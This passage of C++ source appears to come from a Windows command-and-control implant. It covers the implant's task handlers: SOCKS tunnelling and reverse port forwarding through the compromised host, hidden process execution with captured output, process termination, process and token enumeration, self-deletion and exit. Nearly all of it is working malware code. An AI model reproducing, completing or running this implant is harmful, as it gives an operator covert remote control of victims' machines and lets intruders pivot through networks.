                    // Self->Pkg->Int64( Package, COMMAND_TUNNEL_START_TCP );
                    // Self->Pkg->Int16( Package, result );
                }
            }
        }
    }
	
    // --- END OF CHECK PROXY

	ULONG finishTick = Self->Krnl32.GetTickCount() + 2500;
	// while ( this->RecvProxy(packer) && ApiWin->GetTickCount() < finishTick );

        // collect and pack actual proxy data until timeout (adapted RecvProxy logic)
    while ( Self->Krnl32.GetTickCount() < finishTick ) {
        ULONG iterCount = 0;
        KhDbg("In Recv");
        for ( INT i = 0; i < 30; i++ ) {
            if ( Self->Tsp->Tunnels[i].state != TUNNEL_STATE_READY ) continue;

            ULONG dataLength = 0;
            int rc = Self->Ws2_32.ioctlsocket( Self->Tsp->Tunnels[i].Socket, FIONREAD, &dataLength );
            if ( dataLength > 0xFFFFC ) dataLength = 0xFFFFC;

            if ( rc == -1 ) {
                KhDbg("rc = -1, Closing Tunnel %d, Adding to COMMAND_TUNNEL_START_TCP", Self->Tsp->Tunnels[i].ChannelID);
                Self->Tsp->Tunnels[i].state = TUNNEL_STATE_CLOSE;
                ULONG result = 0;

                if (StartTcpLength < 90) {
                    Events[StartTcpLength].ChannelID = Self->Tsp->Tunnels[i].ChannelID;
                    Events[StartTcpLength].SubCmd = COMMAND_TUNNEL_START_TCP;
                    Events[StartTcpLength].Result = result;
                    StartTcpLength++;
                }
                // Self->Pkg->Int32( Package, Self->Tsp->Tunnels[i].ChannelID );
                // Self->Pkg->Int32( Package, COMMAND_TUNNEL_START_TCP );
                // Self->Pkg->Int32( Package, 0 );
            } else {
                KhDbg("rc != -1, dataLength=%lu on Tunnel %d", dataLength, Self->Tsp->Tunnels[i].ChannelID);
                if ( dataLength ) {
                    BYTE* buffer = (BYTE*)hAlloc( dataLength );
                    if (!buffer) continue;
                    
                    BYTE* bufferBase = buffer; // Keep original pointer for freeing and accessing data
                    
                    // ULONG readed = ReadFromSocket( Self->Tsp->Tunnels[i].Socket, (PCHAR)buffer, dataLength );
                    DWORD recvSize;
                    ULONG dwReaded = 0;
                    BOOL continuer = true;
                    BOOL continuer2 = true;
                    ULONG readed = -1;

                    if (dataLength <= 0){
                        continuer = false;
                        readed = 0;
                    }

                    if (continuer){
                        KhDbg("Starting recv loop for Tunnel %d", Self->Tsp->Tunnels[i].ChannelID);
                        while (1) {
                            recvSize = Self->Ws2_32.recv(Self->Tsp->Tunnels[i].Socket, (PCHAR)(buffer + dwReaded), dataLength - dwReaded, 0);
                            if (recvSize == 0 || recvSize == -1)
                                break;
    
                            dwReaded += recvSize;
    
                            if ((int)dwReaded >= dataLength){
                                continuer2 = false;
                                readed = dwReaded;
                                break;
                            }
                        }
                        if(continuer2){
                            Self->Ws2_32.shutdown(Self->Tsp->Tunnels[i].Socket, 2);
                            Self->Ws2_32.closesocket(Self->Tsp->Tunnels[i].Socket);
                            readed = -1;
                        }
                    }
                    KhDbg("Finished recv loop for Tunnel %d, readed=%lu", Self->Tsp->Tunnels[i].ChannelID, readed);

                    if ( readed == (ULONG)-1 ) {
                        KhDbg("readed == -1, Closing Tunnel %d, Adding to COMMAND_TUNNEL_START_TCP", Self->Tsp->Tunnels[i].ChannelID);
                        Self->Tsp->Tunnels[i].state = TUNNEL_STATE_CLOSE;
                        ULONG result = 0;

                        if (StartTcpLength < 90) {
                            Events[StartTcpLength].ChannelID = Self->Tsp->Tunnels[i].ChannelID;
                            Events[StartTcpLength].SubCmd = COMMAND_TUNNEL_START_TCP;
                            Events[StartTcpLength].Result = result;
                            StartTcpLength++;
                        }
                        // Self->Pkg->Int32( Package, t.ChannelID );
                        // Self->Pkg->Int32( Package, COMMAND_TUNNEL_START_TCP );
                        // Self->Pkg->Int32( Package, 0 );
                        hFree( bufferBase );
                    } else if ( readed ) {
                        KhDbg("readed %lu bytes from Tunnel %d, Adding to COMMAND_TUNNEL_WRITE_TCP", readed, Self->Tsp->Tunnels[i].ChannelID);

                        KhDbg( "READED BYTES" );
                        for ( UINT64 i = 0; i < readed; i++ ) {
                            KhDbg( "%02X ", bufferBase[i] );
                        }
                        KhDbg( "Done Printing\n" );


                        if (COMMAND_TUNNEL_WRITE_TCP_EventLen < 90) {
                            Events_Write[COMMAND_TUNNEL_WRITE_TCP_EventLen].ChannelID = Self->Tsp->Tunnels[i].ChannelID;
                            Events_Write[COMMAND_TUNNEL_WRITE_TCP_EventLen].SubCmd = COMMAND_TUNNEL_WRITE_TCP;
                            Events_Write[COMMAND_TUNNEL_WRITE_TCP_EventLen].Data = bufferBase;
                            Events_Write[COMMAND_TUNNEL_WRITE_TCP_EventLen].DataLen = readed;
                            COMMAND_TUNNEL_WRITE_TCP_EventLen++;
                        }

                        // Self->Pkg->Int32( Package, t.ChannelID );
                        // Self->Pkg->Int32( Package, COMMAND_TUNNEL_WRITE_TCP );
                        // Self->Pkg->Bytes( Package, buffer, readed );
                        iterCount += 1;
                    } else {
                        hFree( bufferBase );
                    }
                }
            }
            
        } // for tunnels

        // if no data collected this iteration, break early
        if ( iterCount == 0 ) break;

        // extend/refresh finishTick if you want to keep draining, otherwise loop will exit on timeout
    }

    // === NOW PACK ALL COLLECTED EVENTS ===

    KhDbg("Packing %d COMMAND_TUNNEL_ACCEPT events", COMMAND_TUNNEL_ACCEPT_EventLen);
    
    // Pack event count FIRST
    Self->Pkg->Int32( Package, COMMAND_TUNNEL_ACCEPT_EventLen );

    for (ULONG i = 0; i < COMMAND_TUNNEL_ACCEPT_EventLen; i++) {
        KhDbg("Packing event %d: TunnelID=%lu, SubCmd=%lu, ChannelID=%lu", 
            i, Events_Accept[i].TunnelID, Events_Accept[i].SubCmd, Events_Accept[i].ChannelID);
        
        Self->Pkg->Int32( Package, Events_Accept[i].TunnelID );
        Self->Pkg->Int32( Package, Events_Accept[i].SubCmd );
        Self->Pkg->Int32( Package, Events_Accept[i].ChannelID );
    }

    KhDbg("Packing %d tunnel events", StartTcpLength);
    
    // Pack event count FIRST
    Self->Pkg->Int32( Package, StartTcpLength );

    for (ULONG i = 0; i < StartTcpLength; i++) {
        KhDbg("Packing event %d: ChannelID=%lu, SubCmd=%lu, Result=%lu", 
            i, Events[i].ChannelID, Events[i].SubCmd, Events[i].Result);
        
        Self->Pkg->Int32( Package, Events[i].ChannelID );
        Self->Pkg->Int32( Package, Events[i].SubCmd );
        Self->Pkg->Int32( Package, Events[i].Result );
    }

    KhDbg("Packing %d tunnel Write events", COMMAND_TUNNEL_WRITE_TCP_EventLen);
    
    // Pack event count FIRST
    Self->Pkg->Int32( Package, COMMAND_TUNNEL_WRITE_TCP_EventLen );

    for (ULONG i = 0; i < COMMAND_TUNNEL_WRITE_TCP_EventLen; i++) {
        KhDbg("Packing event %d: ChannelID=%lu, SubCmd=%lu, DataLen=%lu", 
            i, Events_Write[i].ChannelID, Events_Write[i].SubCmd, Events_Write[i].DataLen);
        
        Self->Pkg->Int32( Package, Events_Write[i].ChannelID );
        Self->Pkg->Int32( Package, Events_Write[i].SubCmd );
        Self->Pkg->Bytes( Package, Events_Write[i].Data, Events_Write[i].DataLen );
        Self->Pkg->Int32( Package, Events_Write[i].DataLen );
    }

    // Free all allocated buffers from write events
    for (ULONG i = 0; i < COMMAND_TUNNEL_WRITE_TCP_EventLen; i++) {
        if ( Events_Write[i].Data ) {
            hFree( Events_Write[i].Data );
        }
    }

	// this->CloseProxy();
 
    for (INT i = 0; i < 30; i++) {
        if (Self->Tsp->Tunnels[i].state == TUNNEL_STATE_CLOSE && Self->Tsp->Tunnels[i].ChannelID != 0) {
			
			if (Self->Tsp->Tunnels[i].closeTimer == 0) {
				Self->Tsp->Tunnels[i].closeTimer = Self->Krnl32.GetTickCount();
				continue;
			}

			if (Self->Tsp->Tunnels[i].closeTimer + 1000 < Self->Krnl32.GetTickCount()) {
				if (Self->Tsp->Tunnels[i].mode == TUNNEL_MODE_SEND_TCP || Self->Tsp->Tunnels[i].mode == TUNNEL_MODE_SEND_UDP)
					Self->Ws2_32.shutdown(Self->Tsp->Tunnels[i].Socket, 2);
				
				if (Self->Ws2_32.closesocket(Self->Tsp->Tunnels[i].Socket) && Self->Tsp->Tunnels[i].mode == TUNNEL_MODE_REVERSE_TCP){
					continue;
                }

                KhDbg("Closing Tunnel %d, numTunnelTasks: %d", Self->Tsp->Tunnels[i].ChannelID, Self->Tsp->numTunnelTasks);
				Self->Tsp->Tunnels[i].ChannelID = 0;
                Self->Tsp->Tunnels[i].state = 0;
                Self->Tsp->Tunnels[i].closeTimer = 0;
                Self->Tsp->numTunnelTasks -= 1;
                KhDbg("numTunnelTasks: %d", Self->Tsp->numTunnelTasks);
			}
		}
    }

    if ( Self->Tsp->numTunnelTasks == 0 ){
        Job->Clean = TRUE;
        return KhRetSuccess;
    }

    Job->Clean = FALSE;
    return KhRetSuccess;
}

auto DECLFN Task::Socks(
    _In_ JOBS* Job
) -> ERROR_CODE {
    PACKAGE* Package     = Job->Pkg;
    PARSER*  Parser      = Job->Psr;

    ULONG startFlag = Self->Psr->Int32( Parser );
    KhDbg( "start flag: %d", startFlag );

    INT8 Index = -1;

    switch ( startFlag ) {
        case 0: {
            // Connect to Address + Port
            CHAR* protocol   = nullptr;
            protocol = Self->Psr->Str( Parser, 0 );
            KhDbg( "protocol: %s", protocol );
            ULONG channelID = Self->Psr->Int32( Parser );
            KhDbg( "channelID: %lu", channelID );
            CHAR* address   = nullptr;
            address = Self->Psr->Str( Parser, 0 );
            KhDbg( "address: %s", address );
            ULONG port = Self->Psr->Int32( Parser );
            KhDbg( "port: %d", port );

            for ( INT i = 0; i < 30; i++ ) {
                if ( ! Self->Tsp->Tunnels[i].ChannelID || Self->Tsp->Tunnels[i].ChannelID == 0 ) {
                    Index = i; break;
                }
            }

            if (Index == -1) {
                CHAR* ErrorMsg = "Maximum concurrent Tunnels (30) reached";
                KhDbg("%s", ErrorMsg); QuickErr( ErrorMsg );
                return KhRetSuccess;
            }
            KhDbg("index: %d", Index);

            WSAData wsaData;
            if (Self->Ws2_32.WSAStartup(514, &wsaData)) {
                Self->Ws2_32.WSACleanup();
                CHAR* ErrorMsg = "Unable To Initialize Winsock Library";
                KhDbg("%s", ErrorMsg);
                QuickErr( ErrorMsg );
                return KhRetSuccess;
            }

            SOCKET sock = Self->Ws2_32.socket(AF_INET, SOCK_STREAM, 0);
            if (sock != INVALID_SOCKET) {
                hostent* host = Self->Ws2_32.gethostbyname(address);
                if (host) {
                    sockaddr_in socketAddress = { 0 };
                    Mem::Copy((PVOID)&socketAddress.sin_addr, (PVOID)(*(const void**)host->h_addr_list), host->h_length);
                    socketAddress.sin_family = AF_INET;
                    socketAddress.sin_port = Self->Ws2_32.htons(port);
                    
                    ULONG mode = 1;
                    if (Self->Ws2_32.ioctlsocket(sock, FIONBIO, &mode) != -1) {
                        if (!(Self->Ws2_32.connect(sock, (sockaddr*)&socketAddress, sizeof(sockaddr)) == -1 && 
                            Self->Ws2_32.WSAGetLastError() != WSAEWOULDBLOCK)) {
                            KhDbg("Socket connected successfully: %s:%d", address, port);

                            int mode = 0;

                            Self->Tsp->Tunnels[Index].ChannelID = channelID;
                            Self->Tsp->Tunnels[Index].Host   = address;
                            Self->Tsp->Tunnels[Index].Port = port;
                            Self->Tsp->Tunnels[Index].Username = "";
                            Self->Tsp->Tunnels[Index].Password = ""; 
                            Self->Tsp->Tunnels[Index].Socket = sock;  
                            Self->Tsp->Tunnels[Index].state = TUNNEL_STATE_CONNECT;
                            Self->Tsp->Tunnels[Index].mode = TUNNEL_MODE_SEND_TCP;                     
                            Self->Tsp->Tunnels[Index].waitTime = 30000;                     
                            Self->Tsp->Tunnels[Index].startTick = Self->Krnl32.GetTickCount();                     

                            KhDbg("numTunnelTasks: %d", Self->Tsp->numTunnelTasks);
                            Self->Tsp->numTunnelTasks++;
                            KhDbg("numTunnelTasks: %d", Self->Tsp->numTunnelTasks);
                            if(Self->Tsp->numTunnelTasks == 1){
                                KhDbg("Adding Process Tunnel job");
                                PARSER* TmpPsrDownload = nullptr;
                                BYTE* tmpBufDownload = (BYTE*)hAlloc( sizeof(UINT16) );
                                UINT16 cmdDownload = (UINT16)Enm::Task::ProcessTunnels;
                                JOBS* NewJobDownload = nullptr;
                                // 4-byte big-endian length
                                tmpBufDownload[0] = (cmdDownload     ) & 0xFF;
                                tmpBufDownload[1] = (cmdDownload >> 8) & 0xFF;

                                TmpPsrDownload = (PARSER*)hAlloc( sizeof(PARSER) );
                                if (!TmpPsrDownload) {         
                                    KhDbg("ERROR: Failed to create TmpParser");
                                    return KhGetError;
                                }
                            
                                // Initialize parser (Parser::New makes an internal copy)
                                Self->Psr->New( TmpPsrDownload, tmpBufDownload, sizeof(UINT16) );
                                hFree(tmpBufDownload);
                            
                                // Now create the job — IsResponse = FALSE so Jobs::Create will call Bytes() on TmpPsr
                                NewJobDownload = Self->Jbs->Create( Self->Jbs->TunnelUUID, TmpPsrDownload, TRUE );
                                if ( ! NewJobDownload ) {
                                    KhDbg("WARNING: Failed to create job for Process Tunnel task");
                                    hFree(tmpBufDownload);
                                    return KhGetError;
                                }
                            }

                            return KhRetSuccess;
                            
                        }
                    }
                }
            }

            Self->Ws2_32.closesocket(sock);
            
            ULONG result = 0;
            Self->Pkg->Int64( Package, channelID );
            Self->Pkg->Int64( Package, COMMAND_TUNNEL_START_TCP );
            Self->Pkg->Int16( Package, result );
        }
        case 1: {
            CHAR* protocol   = nullptr;
            protocol = Self->Psr->Str( Parser, 0 );
            KhDbg( "protocol: %s", protocol );
            ULONG channelID = Self->Psr->Int32( Parser );
            KhDbg( "channelID: %lu", channelID );
            ULONG ChunkSize = Self->Psr->Int32( Parser );
            KhDbg( "ChunkSize: %d", ChunkSize );
            BYTE* ChunkData = Self->Psr->Bytes( Parser, 0 );

            KhDbg( "Chunk Bytes on SOCKS WRITE channelID: %lu, Length: %d", channelID, ChunkSize );
            for ( UINT64 i = 0; i < ChunkSize; i++ ) {
                KhDbg( "%02X ", ChunkData[i] );
            }
            KhDbg( "Done Printing\n" );

            INT ChannelIndex = -1;
            for ( INT i = 0; i < 30; i++ ) {
                if ( 
                    Self->Tsp->Tunnels[i].ChannelID && Self->Tsp->Tunnels[i].ChannelID == channelID
                ) { ChannelIndex = i; break; }
            }

            if ( ChannelIndex == -1 ) {
                CHAR* ErrorMsg = "Channel ID not found";
                KhDbg("%s", ErrorMsg);
                QuickErr( ErrorMsg );
                return KhRetSuccess;
            }

            KhDbg("ChannelIndex: %lu", ChannelIndex);

            DWORD finishTick = Self->Krnl32.GetTickCount() + 30000;
			timeval timeout = { 0, 100 };
			fd_set exceptfds;
			fd_set writefds;

            KhDbg( "Breakpoint 2");
			
			while (Self->Krnl32.GetTickCount() < finishTick) {
				writefds.fd_array[0] = Self->Tsp->Tunnels[ChannelIndex].Socket;
				writefds.fd_count = 1;
				exceptfds.fd_array[0] = writefds.fd_array[0];
				exceptfds.fd_count = 1;
                KhDbg( "Breakpoint 2 - In WHile");
				Self->Ws2_32.select(0, 0, &writefds, &exceptfds, &timeout);
                KhDbg( "Breakpoint 2 - In WHile");
				if (Self->Ws2_32.__WSAFDIsSet(Self->Tsp->Tunnels[ChannelIndex].Socket, &exceptfds))
					break;
				if (Self->Ws2_32.__WSAFDIsSet(Self->Tsp->Tunnels[ChannelIndex].Socket, &writefds)) {
                    KhDbg( "Breakpoint 2 - In WHile WHILE");
					if (Self->Ws2_32.send(Self->Tsp->Tunnels[ChannelIndex].Socket, (CHAR*)ChunkData, ChunkSize, 0) != -1 || Self->Ws2_32.WSAGetLastError() != WSAEWOULDBLOCK){
                        KhDbg( "Breakpoint 2 - In WHile WHILE while");
                        CHAR* ErrorMsg = "I DID SOMETHING";
                        KhDbg("%s", ErrorMsg);
                        QuickErr( ErrorMsg );
                        return KhRetSuccess;
                    }
					Self->Krnl32.Sleep(1000);
				}
			}
			break;

        }
        case 2:{
            ULONG channelID = Self->Psr->Int32( Parser );
            KhDbg( "channelID: %lu", channelID );

            for (INT i = 0; i < 30; i++) {
                if (Self->Tsp->Tunnels[i].ChannelID == channelID && Self->Tsp->Tunnels[i].state != TUNNEL_STATE_CLOSE) {
                    Self->Tsp->Tunnels[i].state = TUNNEL_STATE_CLOSE;
                    break;
                }
            }
        }
    }
    KhDbg( "Breakpoint 1");

    return KhRetSuccess;
}

auto Task::RPortfwd(
    _In_ JOBS* Job
) -> ERROR_CODE {
    PACKAGE* Package = Job->Pkg;
    PARSER*  Parser  = Job->Psr;

    INT8  Index     = -1;
    ULONG channelID = Self->Psr->Int32( Parser );
    ULONG port       = Self->Psr->Int32( Parser );

    KhDbg( "channelID: %lu", channelID );
    KhDbg( "port: %d", port );

    for ( INT i = 0; i < 30; i++ ) {
        if ( ! Self->Tsp->Tunnels[i].ChannelID || Self->Tsp->Tunnels[i].ChannelID == 0 ) {
		    if ( ! (Self->Tsp->Tunnels[i].mode == TUNNEL_MODE_REVERSE_TCP && Self->Tsp->Tunnels[i].Port == port && Self->Tsp->Tunnels[i].state != TUNNEL_STATE_CLOSE)) {
                Index = i; break;
            }
        }
    }

    if (Index == -1) {
        CHAR* ErrorMsg = "Maximum concurrent Tunnels (30) reached or Tunnel already exists";
        KhDbg("%s", ErrorMsg); QuickErr( ErrorMsg );
        return KhRetSuccess;
    }

    KhDbg("index: %d", Index);

    WSAData wsaData;
    if (Self->Ws2_32.WSAStartup(514, &wsaData)) {
        Self->Ws2_32.WSACleanup();
        CHAR* ErrorMsg = "Unable To Initialize Winsock Library";
        KhDbg("%s", ErrorMsg);
        QuickErr( ErrorMsg );
        return KhRetSuccess;
    }

    SOCKET sock = Self->Ws2_32.socket(AF_INET, SOCK_STREAM, 0);
    if (sock != INVALID_SOCKET) {
        sockaddr_in socketAddress = { 0 };
        socketAddress.sin_family = AF_INET;
        socketAddress.sin_port = Self->Ws2_32.htons(port);
        
        ULONG mode = 1;
        if (Self->Ws2_32.ioctlsocket(sock, FIONBIO, &mode) != -1) {
            if (Self->Ws2_32.bind(sock, (sockaddr*)&socketAddress, sizeof(socketAddress)) != -1) {
                KhDbg("Socket binded successfully: %d", port);
                if(Self->Ws2_32.listen(sock, 10) != -1){
                    KhDbg("Socket listened successfully: %d", port);
                        
                    Self->Tsp->Tunnels[Index].ChannelID = channelID;
                    Self->Tsp->Tunnels[Index].Port = port;
                    Self->Tsp->Tunnels[Index].Host = "";
                    Self->Tsp->Tunnels[Index].Username = "";
                    Self->Tsp->Tunnels[Index].Password = ""; 
                    Self->Tsp->Tunnels[Index].Socket = sock;  
                    Self->Tsp->Tunnels[Index].state = TUNNEL_STATE_CONNECT;
                    Self->Tsp->Tunnels[Index].mode = TUNNEL_MODE_REVERSE_TCP;                     
                    Self->Tsp->Tunnels[Index].waitTime = 0;                     
                    Self->Tsp->Tunnels[Index].startTick = Self->Krnl32.GetTickCount();                     

                    KhDbg("numTunnelTasks: %d", Self->Tsp->numTunnelTasks);
                    Self->Tsp->numTunnelTasks++;
                    KhDbg("numTunnelTasks: %d", Self->Tsp->numTunnelTasks);
                    if(Self->Tsp->numTunnelTasks == 1){
                        KhDbg("Adding Process Tunnel job");
                        PARSER* TmpPsrDownload = nullptr;
                        BYTE* tmpBufDownload = (BYTE*)hAlloc( sizeof(UINT16) );
                        UINT16 cmdDownload = (UINT16)Enm::Task::ProcessTunnels;
                        JOBS* NewJobDownload = nullptr;
                        // 4-byte big-endian length
                        tmpBufDownload[0] = (cmdDownload     ) & 0xFF;
                        tmpBufDownload[1] = (cmdDownload >> 8) & 0xFF;

                        TmpPsrDownload = (PARSER*)hAlloc( sizeof(PARSER) );
                        if (!TmpPsrDownload) {         
                            KhDbg("ERROR: Failed to create TmpParser");
                            return KhGetError;
                        }
                    
                        // Initialize parser (Parser::New makes an internal copy)
                        Self->Psr->New( TmpPsrDownload, tmpBufDownload, sizeof(UINT16) );
                        hFree(tmpBufDownload);
                    
                        // Now create the job — IsResponse = FALSE so Jobs::Create will call Bytes() on TmpPsr
                        NewJobDownload = Self->Jbs->Create( Self->Jbs->TunnelUUID, TmpPsrDownload, TRUE );
                        if ( ! NewJobDownload ) {
                            KhDbg("WARNING: Failed to create job for Process Tunnel task");
                            hFree(tmpBufDownload);
                            return KhGetError;
                        }
                    }
                
                    KhDbg( "Breakpoint 1");

                    ULONG result = 1;
                    Self->Pkg->Int64( Package, channelID );
                    Self->Pkg->Int64( Package, COMMAND_TUNNEL_REVERSE );
                    Self->Pkg->Int16( Package, result );
                    return KhRetSuccess;
                }    
            }
        }
    }

    Self->Ws2_32.closesocket(sock);
    
    ULONG result = 0;
    Self->Pkg->Int64( Package, channelID );
    Self->Pkg->Int64( Package, COMMAND_TUNNEL_REVERSE );
    Self->Pkg->Int16( Package, result );

    return KhRetSuccess;
}

auto DECLFN Task::Process(
    _In_ JOBS* Job
) -> ERROR_CODE {
    PACKAGE* Package     = Job->Pkg;
    PARSER*  Parser      = Job->Psr;
    UINT8    SbCommandID = Self->Psr->Byte( Parser );
    ULONG    TmpVal      = 0;
    BOOL     Success     = FALSE;

    KhDbg( "sub command id: %d", SbCommandID );

    Self->Pkg->Byte( Package, SbCommandID );

    switch ( SbCommandID ) {
        case Enm::Ps::Create: {
            G_PACKAGE = Package;

            CHAR*               CommandLine = Self->Psr->Str( Parser, &TmpVal );
            PROCESS_INFORMATION PsInfo      = { 0 };

            KhDbg("start to run: %s", CommandLine);

            Success = Self->Ps->Create( CommandLine, TRUE, CREATE_NO_WINDOW, &PsInfo );
            if ( !Success ) return KhGetError;

            Self->Pkg->Int32( Package, PsInfo.dwProcessId );
            Self->Pkg->Int32( Package, PsInfo.dwThreadId  );

            if ( Self->Ps->Out.p ) {
                Self->Pkg->Bytes( Package, (UCHAR*)Self->Ps->Out.p, Self->Ps->Out.s );
                hFree( Self->Ps->Out.p );
                Self->Ps->Out.p = nullptr;
            } 
            
            break;
        }
        case Enm::Ps::Kill: {
            BOOL   RoutineStatus = TRUE;
            ULONG  ProcessId     = Self->Psr->Int32( Parser );
            HANDLE ProcessHandle = Self->Ps->Open( PROCESS_TERMINATE, FALSE, ProcessId );

            if ( ProcessHandle == INVALID_HANDLE_VALUE ) RoutineStatus = FALSE;

            RoutineStatus = Self->Krnl32.TerminateProcess( ProcessHandle, EXIT_SUCCESS );
            
            Self->Pkg->Int32( Package, RoutineStatus ); break;        
        }
        case Enm::Ps::ListPs: {
            PVOID ValToFree = NULL;
            ULONG ReturnLen = 0;
            ULONG Status    = STATUS_SUCCESS;
            BOOL  Isx64     = FALSE;
            PCHAR UserToken = { 0 };
            ULONG UserLen   = 0;

            CHAR FullPath[MAX_PATH] = { 0 };

            HANDLE TokenHandle   = nullptr;
            HANDLE ProcessHandle = nullptr;

            UNICODE_STRING* CommandLine = { 0 };
            FILETIME        FileTime    = { 0 };
            SYSTEMTIME      CreateTime  = { 0 };

            PSYSTEM_THREAD_INFORMATION  SysThreadInfo = { 0 };
            PSYSTEM_PROCESS_INFORMATION SysProcInfo   = { 0 };

            Self->Ntdll.NtQuerySystemInformation( SystemProcessInformation, 0, 0, &ReturnLen );

            SysProcInfo = (PSYSTEM_PROCESS_INFORMATION)hAlloc( ReturnLen );
            if ( !SysProcInfo ) {}
            
            Status = Self->Ntdll.NtQuerySystemInformation( SystemProcessInformation, SysProcInfo, ReturnLen, &ReturnLen );
            if ( Status != STATUS_SUCCESS ) {}

            ValToFree = SysProcInfo;

            SysProcInfo = (PSYSTEM_PROCESS_INFORMATION)( U_PTR( SysProcInfo ) + SysProcInfo->NextEntryOffset );

            do {
                ProcessHandle = Self->Ps->Open( PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, HandleToUlong( SysProcInfo->UniqueProcessId ) );
                if ( Self->Krnl32.K32GetModuleFileNameExA( ProcessHandle, nullptr, FullPath, MAX_PATH ) ) {
                    Self->Pkg->Str( Package, FullPath );
                    Mem::Zero( (UPTR)FullPath, MAX_PATH );
                } else {
                    Self->Pkg->Str( Package, "-" );
                }

                if ( !SysProcInfo->ImageName.Buffer ) {
                    Self->Pkg->Wstr( Package, L"-" );
                } else {
                    Self->Pkg->Wstr( Package, SysProcInfo->ImageName.Buffer );
                }

                CommandLine = (UNICODE_STRING*)hAlloc( sizeof( UNICODE_STRING ) );

                Self->Ntdll.NtQueryInformationProcess( 
                    ProcessHandle, ProcessCommandLineInformation, CommandLine, sizeof( CommandLine ), nullptr 
                );
                if ( CommandLine->Buffer ) {
                    Self->Pkg->Wstr( Package, CommandLine->Buffer );
                } else {
                    Self->Pkg->Wstr( Package, L"-" );
                }

                hFree( CommandLine );
      
                Self->Pkg->Int32( Package, HandleToUlong( SysProcInfo->UniqueProcessId ) );
                Self->Pkg->Int32( Package, HandleToUlong( SysProcInfo->InheritedFromUniqueProcessId ) );
                Self->Pkg->Int32( Package, SysProcInfo->HandleCount );
                Self->Pkg->Int32( Package, SysProcInfo->SessionId );
                Self->Pkg->Int32( Package, SysProcInfo->NumberOfThreads );

                if ( ProcessHandle ) {
                    Self->Tkn->ProcOpen( ProcessHandle, TOKEN_QUERY, &TokenHandle );
                }
                
                UserToken = Self->Tkn->GetUser( TokenHandle );            
                                
                if ( !UserToken ) {
                    Self->Pkg->Str( Package, "-" );
                } else {
                    Self->Pkg->Str( Package, UserToken );
                    hFree( UserToken );
                    Self->Ntdll.NtClose( TokenHandle );
                }
            
                if ( ProcessHandle ) {
                    Self->Krnl32.IsWow64Process( ProcessHandle, &Isx64 );
                }
                
                Self->Pkg->Int32( Package, Isx64 );
                
                SysThreadInfo = SysProcInfo->Threads;
 
                if ( ProcessHandle && ProcessHandle != INVALID_HANDLE_VALUE ) Self->Ntdll.NtClose( ProcessHandle );
            
                SysProcInfo = (PSYSTEM_PROCESS_INFORMATION)( U_PTR( SysProcInfo ) + SysProcInfo->NextEntryOffset );

            } while ( SysProcInfo->NextEntryOffset );

            if ( ValToFree ) hFree( ValToFree );

            break;
        }
    } 

    return KhRetSuccess;
}

auto DECLFN Task::SelfDel(
    _In_ JOBS* Job
) -> ERROR_CODE {
    
     Self->Pkg->Int32( Job->Pkg, Self->Usf->SelfDelete() );

     return KhGetError;
}

auto DECLFN Task::Jobs(
    _In_ JOBS* Job
) -> ERROR_CODE {
    auto Package = Job->Pkg;
    auto Parser  = Job->Psr;

    ULONG JobSubId = Self->Psr->Int32( Parser );

    switch ( JobSubId ) {
    case Enm::Job::List_j: {
        JOBS* Current = Self->Jbs->List;

        Self->Pkg->Int32( Package, Self->Jbs->Count );

        while ( Current ) {
            Self->Pkg->Str( Package, Current->UUID );
            Self->Pkg->Int32( Package, Current->CmdID );
            Self->Pkg->Int32( Package, Current->State );

            Current = Current->Next;
        }
    }
    case Enm::Job::Remove: {
        // todo
    }
    }
    
    return KhRetSuccess;
}

auto DECLFN Task::Exit(
    _In_ JOBS* Job
) -> ERROR_CODE {
    INT8 ExitType = Self->Psr->Byte( Job->Psr );

    Job->State    = KH_JOB_READY_SEND;
    Job->ExitCode = EXIT_SUCCESS;

    Self->Jbs->Send( Self->Jbs->PostJobs );
    Self->Jbs->Cleanup();

    Self->Hp->Clean();

    if ( ExitType == Enm::Exit::Proc ) {
        Self->Ntdll.RtlExitUserProcess( EXIT_SUCCESS );
    } else if ( ExitType == Enm::Exit::Thread ) {
        Self->Ntdll.RtlExitUserThread( EXIT_SUCCESS );
    }

    return KhRetSuccess;
}

